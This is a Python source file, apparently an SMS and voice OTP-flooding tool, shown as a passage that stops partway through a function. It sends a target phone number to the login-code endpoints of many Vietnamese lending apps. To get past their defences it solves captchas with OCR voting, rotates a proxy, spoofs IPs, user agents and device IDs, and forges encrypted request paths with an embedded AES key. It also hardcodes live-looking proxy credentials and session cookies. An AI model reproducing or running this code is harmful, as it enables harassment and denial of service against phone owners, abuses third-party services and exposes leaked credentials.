import sys
import random
import string
import httpx
import asyncio
import time
import uuid
import base64
import hashlib
import json
import io
import unicodedata
from typing import Optional, Any
from urllib.parse import urlparse
from Crypto.Cipher import AES, PKCS1_v1_5 as RSA_PKCS1
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from PIL import ImageFile, Image, ImageEnhance
import ddddocr

ImageFile.LOAD_TRUNCATED_IMAGES = True
_ocr      = ddddocr.DdddOcr(show_ad=False)
_ocr_beta = ddddocr.DdddOcr(show_ad=False, beta=True)
_ocr_old  = ddddocr.DdddOcr(show_ad=False, old=True)



_PROXIES = [
    {
        "proxy": "http://omXE3FBH:f13URJtd9I@sv1.proxysocks5.vn:49205",
        "change_ip_url": "https://api.proxysocks5.vn/api/proxy/changeIp?tokenProxy=5N8XUbxcvDsDBMqFVF49k",
    }
]

_proxy_index = 0


def _current_proxy() -> str:
    return _PROXIES[_proxy_index]["proxy"]


def _current_change_ip_url() -> str:
    return _PROXIES[_proxy_index]["change_ip_url"]


def _rotate_proxy_index() -> None:
    global _proxy_index
    _proxy_index = (_proxy_index + 1) % len(_PROXIES)


_OK1_MAX_CONCURRENT = 300
_ok1_semaphore: Optional[asyncio.Semaphore] = None


def _get_ok1_semaphore() -> asyncio.Semaphore:
    global _ok1_semaphore
    if _ok1_semaphore is None:
        _ok1_semaphore = asyncio.Semaphore(_OK1_MAX_CONCURRENT)
    return _ok1_semaphore


class _ClientCtx:
    def __init__(self, **kw):
        self._kw = kw
        self._client: Optional[httpx.AsyncClient] = None
        self._sem: Optional[asyncio.Semaphore] = None

    async def __aenter__(self) -> httpx.AsyncClient:
        self._sem = _get_ok1_semaphore()
        await self._sem.acquire()
        kw = self._kw.copy()
        kw.setdefault("http2", False)
        self._client = httpx.AsyncClient(**kw)
        return await self._client.__aenter__()

    async def __aexit__(self, *args):
        try:
            if self._client is not None:
                await self._client.__aexit__(*args)
        finally:
            if self._sem is not None:
                self._sem.release()


def _make_client(**kw) -> _ClientCtx:
    return _ClientCtx(**kw)


async def _doi_ip():
    try:
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.get(_current_change_ip_url())
        print(f"[ChangeIP] {r.status_code} — {r.text[:100]}")
        _rotate_proxy_index()
    except Exception as e:
        print(f"Okay")


_XMH_UA_POOL = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36",
]

_IOS_CFNETWORK = [
    ("1568.300.101", "24.2.0"),
    ("1568.200.51", "24.1.0"),
    ("1490.0.4", "23.6.0"),
    ("1490.0.4", "23.5.0"),
    ("1480.0.4", "23.4.0"),
]

HO = [
    "Nguyễn", "Trần", "Lê", "Phạm", "Hoàng", "Huỳnh", "Phan",
    "Vũ", "Võ", "Đặng", "Bùi", "Đỗ", "Hồ", "Ngô", "Dương"
]
TEN_DEM = [
    "Văn", "Thị", "Minh", "Quốc", "Thanh", "Ngọc", "Gia",
    "Đức", "Hữu", "Anh", "Tuấn", "Bảo", "Kim", "Xuân"
]
TEN = [
    "An", "Bình", "Dũng", "Hùng", "Huy", "Khánh", "Long",
    "Nam", "Phúc", "Quân", "Sơn", "Thành", "Thắng", "Tú",
    "Việt", "Linh", "Lan", "Trang", "Mai", "Hương",
    "Phương", "Nhung", "Thảo", "Yến", "Ngân"
]


def random_vietnamese_name():
    return f"{random.choice(HO)} {random.choice(TEN_DEM)} {random.choice(TEN)}"


def remove_accents(text):
    return ''.join(
        c for c in unicodedata.normalize("NFD", text)
        if unicodedata.category(c) != "Mn"
    )


def generate_email():
    full_name = random_vietnamese_name()
    username = remove_accents(full_name).lower().replace(" ", "")
    username += str(random.randint(10000, 99999))
    return f"{username}@gmail.com"


email = generate_email()


def get_random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))


def get_random_ipv6():
    return ":".join(format(random.randint(0, 65535), "x") for _ in range(8))


def _random_android_id() -> str:
    return "".join(random.choices("0123456789abcdef", k=32))


def gen_device_id():
    return str(uuid.uuid4()).upper()


def _qq_solve(b64_str: str) -> str:
    """Giải captcha ảnh dùng nhiều model OCR + nhiều kiểu tiền xử lý rồi vote."""
    def _read(pil_img, model=_ocr) -> str:
        buf = io.BytesIO()
        pil_img.convert("RGB").save(buf, format="PNG")
        try:
            r = model.classification(buf.getvalue())
            return r.strip() if isinstance(r, str) else ""
        except Exception:
            return ""

    try:
        raw = base64.b64decode(b64_str)
        img = Image.open(io.BytesIO(raw))
        img.load()
        rgb = img.convert("RGB")
        gray = img.convert("L")

        # Tạo danh sách ảnh biến thể
        variants = [
            rgb,
            img.resize((img.width * 3, img.height * 3), Image.LANCZOS).convert("RGB"),
            img.resize((img.width * 4, img.height * 4), Image.LANCZOS).convert("RGB"),
            ImageEnhance.Contrast(rgb).enhance(2.0),
            ImageEnhance.Contrast(rgb).enhance(3.0),
            ImageEnhance.Sharpness(rgb).enhance(2.5),
            gray.convert("RGB"),
            ImageEnhance.Contrast(gray.convert("RGB")).enhance(3.0),
            # binary threshold
            gray.point(lambda p: 255 if p > 128 else 0).convert("RGB"),
            gray.point(lambda p: 255 if p > 100 else 0).convert("RGB"),
            # invert (dark bg, light text)
            ImageEnhance.Contrast(
                Image.fromarray(255 - __import__("numpy").array(gray)).convert("RGB")
            ).enhance(2.0) if True else rgb,
        ]

        candidates: list[str] = []
        for v in variants:
            for model in (_ocr, _ocr_beta, _ocr_old):
                res = _read(v, model)
                if res:
                    candidates.append(res)

        if not candidates:
            return ""

        # Chọn kết quả có độ dài ≥ 4 và xuất hiện nhiều nhất (voting)
        from collections import Counter
        valid = [c for c in candidates if len(c) >= 4]
        if valid:
            return Counter(valid).most_common(1)[0][0]
        # Nếu không có kết quả ≥4 ký tự, trả về kết quả dài nhất
        return max(candidates, key=len)
    except Exception:
        return ""


def _t24h_jwt_remaining(tok: str) -> int:
    try:
        import base64 as _b64
        seg = tok.split(".")[1]
        seg += "=" * (4 - len(seg) % 4)
        exp = json.loads(_b64.b64decode(seg)).get("exp", 0)
        return max(0, exp - int(time.time()))
    except Exception:
        return 0


def _load_appcheck_token(app_id: str) -> str:
    import pathlib as _pl
    candidates = [
        _pl.Path(__file__).parent / "tokens.json",
        _pl.Path("/root/tokens.json"),
    ]
    for p in candidates:
        try:
            if not p.exists():
                continue
        except (PermissionError, OSError):
            continue
        try:
            data = json.loads(p.read_text(encoding="utf-8"))
            for app in data.get("apps", []):
                if app.get("id") == app_id:
                    tok = app.get("firebaseAppCheck") or ""
                    if not tok:
                        print(f"[tokens.json] ⚠️  [{app_id}] chưa có token — chạy grab-jwt trước")
                        return ""
                    remaining = _t24h_jwt_remaining(tok)
                    if remaining > 120:
                        return tok
                    print(f"[tokens.json] ⚠️  [{app_id}] token hết hạn ({remaining}s còn lại) — đang chờ grab-jwt refresh")
                    return ""
            print(f"[tokens.json] ⚠️  Không tìm thấy app_id='{app_id}' trong {p}")
            return ""
        except Exception as e:
            print(f"[tokens.json] ❌ Lỗi đọc {p}: {e}")
    print(f"[tokens.json] ❌ Không tìm thấy tokens.json")
    return ""


def _load_gt365_captcha() -> str:
    import pathlib as _pl
    candidates = [
        _pl.Path(__file__).parent / "tokens.json",
        _pl.Path("/root/tokens.json"),
    ]
    for p in candidates:
        try:
            if not p.exists():
                continue
        except (PermissionError, OSError):
            continue
        try:
            data = json.loads(p.read_text(encoding="utf-8"))
            for app in data.get("apps", []):
                if app.get("id") == "gt365":
                    tok = app.get("captchaToken") or ""
                    if tok:
                        return tok
                    print("[tokens.json] ⚠️  [gt365] chưa có captchaToken — chạy grab-jwt trước")
                    return ""
            print("[tokens.json] ⚠️  Không tìm thấy id='gt365' trong tokens.json")
            return ""
        except Exception as e:
            print(f"[tokens.json] ❌ Lỗi đọc {p}: {e}")
    print("[tokens.json] ❌ Không tìm thấy tokens.json")
    return ""


_CV2_IOS_UA = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
)
_CV2_AND_UA_POOL = [
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro)",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-G998B)",
    "Dalvik/2.1.0 (Linux; U; Android 14; SM-S901B)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Xiaomi 13 Pro)",
    "Dalvik/2.1.0 (Linux; U; Android 15; POCO X6 Pro)",
]


def _cv2_hdrs(origin: str, mode: str = "android") -> dict:
    ua = _CV2_IOS_UA if mode == "ios" else random.choice(_CV2_AND_UA_POOL)
    base = origin.rstrip("/")
    return {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json",
        "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "User-Agent": ua,
        "Origin": base,
        "Referer": base + "/",
        "X-Device-Id": str(uuid.uuid4()),
        "X-Device-ID-Alt": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": get_random_ip(),
        "Connection": "keep-alive",
    }


async def _cv2_send(
    phone: str,
    api_url: str,
    payload: dict,
    label: str,
    origin: str = "",
    mode: str = "android",
    extra_hdrs: dict | None = None,
) -> bool:
    try:
        hdrs = _cv2_hdrs(origin or api_url.split("/v2")[0], mode)
        if extra_hdrs:
            hdrs.update(extra_hdrs)
        async with httpx.AsyncClient(timeout=20, verify=False) as client:
            r = await client.post(api_url, json=payload, headers=hdrs)
        biz_code = ""
        try:
            d = r.json()
            biz_code = str(d.get("code", ""))
            ok = biz_code in ("200", "0")
            msg = d.get("message", "")
        except Exception:
            ok = r.status_code in (200, 201)
            msg = r.text[:200].replace("\n", " ")
        if ok:
            print(f"[{label}] ✅ OK")
        else:
            print(f"[{label}] ❌ {msg or biz_code}")
        return ok
    except Exception as exc:
        print(f"[{label}] ERR {type(exc).__name__}: {exc}")
        return False


# ── App-Send core ──
_APP_UA_IOS = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
_APP_UA_CF  = "WorkHome/20 CFNetwork/1568.200.51 Darwin/24.1.0"
_APP_UA_CF2 = "laviFinance/1 CFNetwork/1568.200.51 Darwin/24.1.0"


def _xmh_local_phone(phone: str) -> str:
    p = phone.lstrip("+")
    if p.startswith("84"):
        p = "0" + p[2:]
    elif not p.startswith("0"):
        p = "0" + p
    return p


def _app_body_full(ownership: str, app_version: str = "1.1.0"):
    def _build(phone: str, figure_veri) -> dict:
        return {
            "i18n": "vi_VN",
            "reqSource": "Ios",
            "phoneName": "iPhone13,3",
            "appVersion": app_version,
            "androidversion": "iOS18.1",
            "webVersion": "1.0.0",
            "deviceID": str(uuid.uuid4()).upper(),
            "uuid": uuid.uuid4().hex,
            "pagingData": 0,
            "exquisiteItemType": 1,
            "ownerShip": ownership,
            "token": "",
            "phoneNo": phone,
            "veriType": "LOGIN",
            "figureVeri": figure_veri,
        }
    return _build


def _app_body_simple(ownership: str):
    def _build(phone: str, figure_veri) -> dict:
        return {
            "i18n": "vi_VN",
            "reqSource": "Ios",
            "phoneName": "iPhone13,3",
            "appVersion": "1.1.0",
            "ownerShip": ownership,
            "veriType": "LOGIN",
            "figureVeri": figure_veri,
            "phoneNo": phone,
        }
    return _build


async def _app_send(
    phone: str,
    base_url: str,
    endpoint: str,
    headers_fn,
    make_body,
    label: str,
    cap_key: str = "captcha",
    proxy=None,
    _retry: bool = True,
) -> bool:
    if proxy is None:
        proxy = _current_proxy()

    try:
        async with _make_client(timeout=20, follow_redirects=True, proxy=proxy) as c:
            r1 = await c.post(
                f"{base_url}{endpoint}", headers=headers_fn(), json=make_body(phone, False)
            )
            if r1.status_code != 200:
                print(f"[{label}] HTTP {r1.status_code}: {r1.text[:120]}")
                return False
            d1 = r1.json()
            code1 = str(d1.get("code", ""))
            if code1 == "0":
                print(f"[{label}] ✅ OK (lần 1, không cần captcha)")
                return True
            cap_b64 = (d1.get("data") or {}).get(cap_key, "")
            if not cap_b64:
                print(f"[{label}] server từ chối: {d1.get('message') or r1.text[:120]}")
                return False
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f"[{label}] OCR thất bại — captcha len={len(cap_b64)}")
                return False
            r2 = await c.post(
                f"{base_url}{endpoint}", headers=headers_fn(), json=make_body(phone, answer)
            )
            if r2.status_code != 200:
                print(f"[{label}] HTTP {r2.status_code} (sau captcha): {r2.text[:120]}")
                return False
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f"[{label}] ✅ OK (captcha={answer!r})")
            else:
                print(f"[{label}] ❌ server từ chối (sau captcha): {d2.get('message') or r2.text[:120]}")
            return ok
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
        if _retry:
            print(f"[{label}] retry lần 2...")
            return await _app_send(
                phone, base_url, endpoint, headers_fn, make_body, label,
                cap_key=cap_key, proxy=proxy, _retry=False,
            )
        return False


# ── QuickQuang ──
_QQ_APP_BASE = "https://ang.quickquangapp.com"


def _qq_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "quiquang_ios",
        "Origin": _QQ_APP_BASE,
        "Referer": _QQ_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_qq_app_body = _app_body_full("quiquang_ios")


async def Call_QQ_SMS(phone):
    return await _app_send(
        phone, _QQ_APP_BASE, "/base/xmh/getSMSCode", _qq_app_hdrs, _qq_app_body, "QQ-SMS"
    )


async def Call_QQ_Voice(phone):
    return await _app_send(
        phone, _QQ_APP_BASE, "/base/xmh/getVoiceCode", _qq_app_hdrs, _qq_app_body, "QQ-Voice"
    )


# ── WanPay Financial ──
_WAN_APP_BASE = "https://wan.wanpaya.com"


def _wan_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "wanpayFinancial_ios",
        "Origin": _WAN_APP_BASE,
        "Referer": _WAN_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_wan_app_body = _app_body_full("wanpayFinancial_ios")


async def Call_Wan_SMS(phone):
    return await _app_send(
        phone, _WAN_APP_BASE, "/base/xmh/getSMSCode", _wan_app_hdrs, _wan_app_body, "Wan-SMS"
    )


async def Call_Wan_Voice(phone):
    return await _app_send(
        phone, _WAN_APP_BASE, "/base/xmh/getVoiceCode", _wan_app_hdrs, _wan_app_body, "Wan-Voice"
    )


# ── PtVayNhanh ──
_PTV_APP_BASE = "https://app.phuthinhvay.com"


def _ptv_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encrypttype": "0",
        "disturbedurl": "0",
        "disturbedpar": "0",
        "ownership": "PTVayNhanh_ios",
        "User-Agent": _APP_UA_CF,
    }


_ptv_app_body = _app_body_simple("PTVayNhanh_ios")


async def Call_PTV_SMS(phone):
    return await _app_send(
        phone, _PTV_APP_BASE, "/lvjKRH/brRsY/JHkuyNids/RlhiPz",
        _ptv_app_hdrs, _ptv_app_body, "PTV-SMS", cap_key="jmJiSn2D1",
    )


async def Call_PTV_Voice(phone):
    return await _app_send(
        phone, _PTV_APP_BASE, "/lvjKRH/brRsY/getVoiceCode",
        _ptv_app_hdrs, _ptv_app_body, "PTV-Voice",
    )


# ── LaviFinance ──
_LAVI_APP_BASE = "https://tin.lavifinancecompany.com"


def _lavi_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "identity",
        "encrypted": "0",
        "encryptType": "0",
        "ownerShip": "laviFinance_ios",
        "User-Agent": _APP_UA_CF2,
    }


_lavi_app_body_raw = _app_body_simple("laviFinance_ios")


def _lavi_app_body(phone: str, figure_veri):
    return _lavi_app_body_raw(_xmh_local_phone(phone), figure_veri)


async def Call_Lavi_SMS(phone):
    return await _app_send(
        phone, _LAVI_APP_BASE, "/base/xmh/getSMSCode", _lavi_app_hdrs, _lavi_app_body, "Lavi-SMS"
    )


async def Call_Lavi_Voice(phone):
    return await _app_send(
        phone, _LAVI_APP_BASE, "/base/xmh/getVoiceCode", _lavi_app_hdrs, _lavi_app_body, "Lavi-Voice",
    )


# ── VayNhanh ──
_VAY_NHANH_BASE = "https://lend.vtnhanh.com"


def _vay_nhanh_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "vtnhanh_ios",
        "Origin": _VAY_NHANH_BASE,
        "Referer": _VAY_NHANH_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_vnhanh_app_body = _app_body_full("vtnhanh_ios")


async def Vay_Nhanh_SMS(phone):
    return await _app_send(
        phone, _VAY_NHANH_BASE, "/base/xmh/getSMSCode",
        _vay_nhanh_hdrs, _vnhanh_app_body, "VayNhanh-SMS",
    )


# ── FBFinance (PublicBankAMC) ──
_FB_FINANCE_BASE = "https://max.vpamc.com"


def _fb_finance_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "publicbankamc_ios",
        "Origin": _FB_FINANCE_BASE,
        "Referer": _FB_FINANCE_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_fbfinance_app_body = _app_body_full("publicbankamc_ios")


async def FB_Finance_SMS(phone):
    return await _app_send(
        phone, _FB_FINANCE_BASE, "/base/xmh/getSMSCode",
        _fb_finance_hdrs, _fbfinance_app_body, "FBFinance-SMS",
    )


# ── SeaBankAsset ──
_SEABANK_ASSET_BASE = "https://lend.seabankassetcompany.com"


def _seabankasset_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "i18n": "hi_IN",
        "reqSource": "Ios",
        "ownerShip": "sealend_ios",
        "encrypted": "0",
        "encryptType": "1",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Origin": "http://lend.seabankassetcompany.com",
        "Referer": "http://lend.seabankassetcompany.com/",
    }


def _seabankasset_body(phone: str, figure_veri) -> dict:
    return {
        "i18n": "hi_IN",
        "reqSource": "Ios",
        "phoneName": "",
        "appVersion": "1.0.0",
        "androidversion": "iPhone18.1",
        "deviceID": uuid.uuid4().hex,
        "pagingData": 0,
        "exquisiteItemType": 1,
        "ownerShip": "sealend_ios",
        "uuid": "",
        "token": "",
        "phoneNo": phone,
        "veriType": "LOGIN",
        "figureVeri": figure_veri if figure_veri else "",
    }


async def seabankasset(phone):
    return await _app_send(
        phone, _SEABANK_ASSET_BASE, "/base/xmh/getSMSCode",
        _seabankasset_hdrs, _seabankasset_body, "SeaBan-SMS",
    )


# ── AChauLoan ──
_ACHAU_APP_BASE = "https://tien.achauloan.com"


def _achau_app_hdrs():
    return {
        "Accept": "*/*",
        "disturbedurl": "0",
        "encrypttype": "1",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "encrypted": "0",
        "Content-Type": "application/json",
        "User-Agent": "vetnam_xingxing_01/6 CFNetwork/1568.200.51 Darwin/24.1.0",
        "ownership": "AChauLoan_ios",
        "disturbedpar": "1",
    }


def _achau_app_body(phone, figure_veri):
    return {
        "reqSource": "Ios",
        "phoneName": "iPhone",
        "appVersion": "1.2.9",
        "androidversion": "iOS 18.1",
        "deviceID": str(uuid.uuid4()).upper(),
        "i18n": "vi-VN",
        "phoneNo": _xmh_local_phone(phone),
        "veriType": "LOGIN",
        "figureVeri": figure_veri,
    }


async def Call_AChau_SMS(phone):
    return await _app_send(
        phone, _ACHAU_APP_BASE, "/AQadQ/Jfmb/goMXd/IuGP",
        _achau_app_hdrs, _achau_app_body, "AChau-SMS",
    )


# ── PetroVay (GPAMCloan) ──
_PETRO_APP_BASE = "https://loan.gpamcloan.com"


def _petro_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "GPAMCloan_ios",
        "Origin": _PETRO_APP_BASE,
        "Referer": _PETRO_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_petro_app_body = _app_body_full("GPAMCloan_ios")


async def Call_Petro_SMS(phone):
    return await _app_send(
        phone, _PETRO_APP_BASE, "/base/xmh/getSMSCode",
        _petro_app_hdrs, _petro_app_body, "Petro-SMS",
    )


async def Call_Petro_Voice(phone):
    return await _app_send(
        phone, _PETRO_APP_BASE, "/base/xmh/getVoiceCode",
        _petro_app_hdrs, _petro_app_body, "Petro-Voice",
    )


# ── Hataco (HTC) ──
_HTC_APP_BASE = "https://tin.hatacocompany.com"


def _htc_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "hatacovay_ios",
        "Origin": _HTC_APP_BASE,
        "Referer": _HTC_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_htc_app_body = _app_body_full("hatacovay_ios", app_version="1.0.2")


async def Call_HTC_SMS(phone):
    return await _app_send(
        phone, _HTC_APP_BASE, "/base/xmh/getSMSCode",
        _htc_app_hdrs, _htc_app_body, "HTC-SMS",
    )


async def Call_HTC_Voice(phone):
    return await _app_send(
        phone, _HTC_APP_BASE, "/base/xmh/getVoiceCode",
        _htc_app_hdrs, _htc_app_body, "HTC-Voice",
    )


# ── RiveCredit ──
_REVE_APP_BASE = "https://lend.revecredit.com"


def _reve_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encrypttype": "0",
        "disturbedurl": "0",
        "disturbedpar": "1",
        "ownership": "RiveCredit_ios",
        "User-Agent": "vnRive/5 CFNetwork/1568.200.51 Darwin/24.1.0",
    }


_reve_app_body_raw = _app_body_simple("RiveCredit_ios")


def _reve_app_body(phone: str, figure_veri):
    return _reve_app_body_raw(_xmh_local_phone(phone), figure_veri)


async def Call_Reve_SMS(phone):
    return await _app_send(
        phone, _REVE_APP_BASE, "/base/xmh/getSMSCode",
        _reve_app_hdrs, _reve_app_body, "Reve-SMS",
    )


async def Call_Reve_Voice(phone):
    return await _app_send(
        phone, _REVE_APP_BASE, "/base/xmh/getVoiceCode",
        _reve_app_hdrs, _reve_app_body, "Reve-Voice",
    )


_VAYCASH_NET_HDR = {
    "x-client-type": "phone",
    "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
}
_MARVAY_NEW_BASE = "https://new.marttimeassrt.com"


async def Call_MarVay_SMS(phone):
    return await _cv2_send(
        phone,
        "https://mvvai.marttimeassrt.com/v2/login/captcha",
        {
            "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
            "app_package_name": "com.maritme.assrt.vn", "platform": "android",
            "type": 1, "app_id": "266000000",
        },
        "MarVay-SMS",
        "https://ios-h5.marttimeassrt.com",
    )


async def Call_MarVay_Voice(phone):
    return await _cv2_send(
        phone,
        "https://mvvii.marttimeassrt.com/v2/login/captcha",
        {
            "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
            "app_package_name": "com.maritme.assrt.vn", "platform": "android",
            "type": 2, "app_id": "266000001",
        },
        "MarVay-Voice",
        "https://ios-h5.marttimeassrt.com",
    )


def _marvay_new_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "marttimeassrt_ios",
        "Origin": _MARVAY_NEW_BASE,
        "Referer": _MARVAY_NEW_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_marvay_new_body = _app_body_full("marttimeassrt_ios")


async def Call_MarVay_New(phone):
    return await _app_send(
        phone, _MARVAY_NEW_BASE, "/base/xmh/getSMSCode",
        _marvay_new_hdrs, _marvay_new_body, "MarVay-New",
        proxy=None,
    )


async def call8(phone):
    headers = {
        "content-type": "application/json; charset=utf-8",
        "x-client-type": "phone",
    }
    payload = {
        "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
        "app_package_name": "com.maritme.assrt.vn", "platform": "android",
        "app_id": "266000001", "type": 2,
    }
    try:
        async with _make_client(timeout=20, verify=False) as client:
            r = await client.post(
                "https://mvvii.marttimeassrt.com/v2/login/captcha",
                json=payload, headers=headers,
            )
        ok = r.status_code == 200
        print(f"[call8] {'✅ OK' if ok else f'❌ HTTP {r.status_code}: {r.text[:100]}'}")
        return ok
    except Exception as e:
        print(f"[call8] ERR {type(e).__name__}: {e}")
        return False


# ══════════════════════════════════════════════════════════════════════════════
# NHÓM 2 — VVAY AES-CBC FRAMEWORK
# Các dịch vụ dùng chung _vvay_encrypt / _lt_generic:
#   V88Dong · SenVay · ITake
# ══════════════════════════════════════════════════════════════════════════════

# ── VVay AES-CBC core ──
_VVAY_KEY = b"aajiaozicashmeh5"
_VVAY_IV  = b"hajiaozicashmeh5"


def _vvay_encrypt(data) -> str:
    if isinstance(data, dict):
        data = json.dumps(data, indent=2, separators=(",", " : "))
    ct = AES.new(_VVAY_KEY, AES.MODE_CBC, _VVAY_IV).encrypt(pad(data.encode(), 16))
    return base64.b64encode(ct).decode()


def _vvay_encrypt_path(path: str) -> str:
    ct = AES.new(_VVAY_KEY, AES.MODE_CBC, _VVAY_IV).encrypt(pad(path.encode(), 16))
    return base64.b64encode(ct).decode()


def _vvay_decrypt(b64_str: str):
    ct = base64.b64decode(b64_str)
    plain = unpad(AES.new(_VVAY_KEY, AES.MODE_CBC, _VVAY_IV).decrypt(ct), 16)
    text = plain.decode("utf-8").strip()
    try:
        return json.loads(text)
    except Exception:
        return text


# ── LT Generic (SenVay family) ──
def _lt_rand_path() -> str:
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    return "/h5/" + "".join(random.choice(chars) for _ in range(32))


async def _lt_generic(
    phone: str, is_voice: bool, host: str, app_id: str, ua_token: str, version: str = "1.0.0_1.0.2"
) -> bool:
    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    path = "/login/requestVerifyCode"
    gw_path = _lt_rand_path()
    device_id = uuid.uuid4().hex
    label = f"{ua_token} {'Voice' if is_voice else 'SMS'}"
    headers = {
        "appId": app_id,
        "language": "vi-VN",
        "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) {ua_token}",
        "Referer": f"https://{host}/login",
        "fpPlatform": "2",
        "Origin": f"https://{host}",
        "real_path": path,
        "fpDeviceId": "",
        "version": version,
        "fingerPrint": "",
        "deviceId": device_id,
        "platform": "2",
        "token": "",
        "x_x_path": _vvay_encrypt_path(path),
        "loginPlatform": "APP",
        "marketToken": "",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Connection": "keep-alive",
    }
